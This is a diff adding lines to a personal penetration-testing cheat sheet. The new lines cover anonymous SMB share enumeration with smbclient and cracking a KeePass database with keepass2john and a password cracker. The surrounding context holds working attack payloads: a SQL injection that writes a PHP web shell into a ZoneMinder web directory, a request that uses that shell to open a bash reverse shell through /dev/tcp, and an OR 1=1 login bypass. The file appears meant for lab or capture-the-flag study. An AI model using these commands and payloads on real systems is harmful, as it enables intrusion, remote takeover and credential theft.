@@ -49,6 +49,8 @@ $ smbmap -H ipadd
 $ smbmap -u '' -p '' -R -H IP
 $ smbclient //ipadd/dir (v)
 -> check get, !ls, !cat
+$ smbclient -L <IP> -U anonymous%anonymous
+$ smbclient //<IP>/dir -U anonymous%anonymous
 $ smbclient -U '' -L //ip
 $ smbclient -L //IP -N OR \\$IP
 $ smbclient -N //IP/tmp -> dir, put
@@ -155,6 +157,9 @@ sample find sql injection:
 view=request&request=log&task=query&limit=100;SELECT+'<%3fphp+system($_GET[0])%3b%3f>'+into+outfile+'/usr/share/zoneminder/www/includes/reds.php'--+-
 access:
 http://IP/zm/includes/reds.php?0=/bin/bash+-c+%27bash+-i+%3E%26+/dev/tcp/IP/80+0%3E%261%27
+
+if you found file.kdbx, convert use:
+keepass2john file.kdbx > file.txt, then crack it use hackcat
 
 SQL trigered:
 <username>' OR 1=1--
